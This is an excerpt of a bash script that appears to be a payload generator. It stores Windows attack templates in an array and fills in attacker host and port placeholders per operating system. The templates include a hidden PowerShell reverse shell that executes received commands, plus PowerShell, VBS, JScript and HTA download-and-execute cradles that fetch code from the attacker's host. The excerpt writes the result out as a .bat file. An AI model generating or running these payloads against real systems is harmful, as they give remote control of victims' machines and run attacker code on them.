...
declare -A PAYLOADS_WINDOWS=(
    ["powershell_tcp"]="powershell -NoP -NonI -W Hidden -Command \"\$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);iex \$data}\""
    ["powershell_web"]="powershell -NoP -NonI -W Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://LHOST:LPORT')\""
    ["vbs"]="Set s = CreateObject(\"WScript.Shell\")\ns.Run \"powershell -NoP -NonI -W Hidden -Command IEX(New-Object Net.WebClient).DownloadString(\\\"http://LHOST:LPORT\\\")\""
    ["js"]="var s = new ActiveXObject(\"WScript.Shell\");\ns.Run(\"powershell -NoP -NonI -W Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://LHOST:LPORT')\");"
    ["hta"]="<script>new ActiveXObject(\"WScript.Shell\").Run(\"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://LHOST:LPORT')\")</script>"
)
...
case "$OS" in
    linux)
        ...
        ;;
    windows)
        FORMATS=("powershell_tcp" "powershell_web" "vbs" "js" "hta")
        ;;
    macos)
...
case "$OS" in
    linux)
        ...
        ;;
    windows)
        TEMPLATE=${PAYLOADS_WINDOWS[$PAYLOAD_TYPE]}
        EXT=".bat"
        ;;
    macos)
